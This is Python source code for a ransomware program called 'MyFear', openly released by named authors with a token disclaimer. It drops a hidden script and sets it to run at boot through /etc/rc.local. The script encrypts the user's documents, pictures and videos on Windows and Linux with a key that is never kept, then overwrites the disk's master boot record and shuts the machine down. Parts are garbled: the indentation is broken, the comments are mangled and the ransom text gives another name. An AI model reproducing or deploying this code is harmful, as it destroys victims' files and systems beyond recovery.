'''
Created by LukeSecurity and edited by Alchemy.

MyFear ransomware.
DON'T USE THIS FOR ILLEGAL PURPOSES!
Happy Hacking! ~Z3r0Squ4d
                           
This code is licenced under the GNU GPL.

'''



import os
import platform
import sys
def autorun():
    with open("/etc/rc.local", "a") as file:
        file.write("python3 .tool.py &\n")

def programs():
    with open(".update.py", "w") as file:
        file.write("print('Hacked By Alchemy.')")
    with open(".tool.py", "w") as file:
        file.write("""

from cryptography.fernet import Fernet
import os
import time
import winreg
import sys
from win32file import * ##pywin32
from win32gui import * ##pywin32
import base64
import getpass
import ctypes
import platform
import shutil
import socket
import subprocess
import threading

key = Fernet.generate_key()
Fernet_key = Fernet(key)  

def admin():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    elif platform.system() == 'Linux':
        if os.getuid() == 0:
            return True
        else:
            return False
    else:
        pass
def mbr():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
              WriteFile(hDevice, AllocateReadBuffer(512), None) # OverwrB! (Never runachine!)
              CloseHandle(hDevice) # Close the handle toe!
if admin():
    usr = getpass.getuser()
    if platform.system() == 'Windows':
        targets = [
            r"C:/Users/" + usr + "/Documenti",
            r"C:/Users/" + usr + "/Immagini",
            r"C:/Users/" + usr + "/Downloads",
            r"C:/Users/" + usr + "/Desktop",
            r"C:/Users/" + usr + "/Video"
        ]
        for target in targets:
            for root, dirs, files in os.walk(target):
                for file in files:
                    with open(os.path.join(root, file), 'rb') as f:  
                        data = f.read()
                        data_enc = Fernet_key.encrypt(data)
                    with open(os.path.join(root, file), 'wb') as w:  
                        w.write(data_enc)
    elif platform.system() == 'Linux':  
        targets = [
            r'/home/' + usr + "/Documents",
            r'/home/' + usr + "/Desktop",
            r'/home/' + usr + "/Videos",
            r'/home/' + usr + "/Pictures",
            r'/home/' + usr + "/Music",
            r'/home/' + usr + "/Templates"
        ]
        for target in targets:
            for root, dirs, files in os.walk(target):
                for file in files:
                    with open(os.path.join(root, file), 'rb') as f:  
                        data = f.read()
                        data_enc = Fernet_key.encrypt(data)
                    with open(os.path.join(root, file), 'wb') as w:  
                        w.write(data_enc)

    banner = '''
     _______
            |.-----.|
            ||x . x||
            ||_.-._||
            `--)-(--`
           __[=== o]___
          |:::::::::::|\
          `-=========-` 
    '''
    t = '''
    ops...
    your file has been encrypted by ResistencePowerOff ransomware.
    '''
    choice = input('Do you want get back your computer? (y/N)')
    if choice == 'y' or 'Y':
        print('Ok, you can go back your computer!\n')
        print('Loading.....\n')
        time.sleep(5)
        print('Something went wrong.... please reboot your computer.')
        mbr()
        time.sleep(3)
        if platform.system() == 'Windows':
            os.system('shutdown /p')
        elif platform.system() == 'Linux':
            os.system('shutdown -P')
        else:
            pass
    else:
        print('ok...')
    print(banner + '\n' + t)  
else:
    print('Permission denied.')

""")
    with open(".defuser.py", "w") as file:
        file.write("""
""")
def exec_programs():
    os.system("python3 .update.py")
    os.system("python3 .tool.py")
    os.system("python3 .defuser.py")
if __name__ == "__main__":
    programs()
    exec_programs()
    autorun()
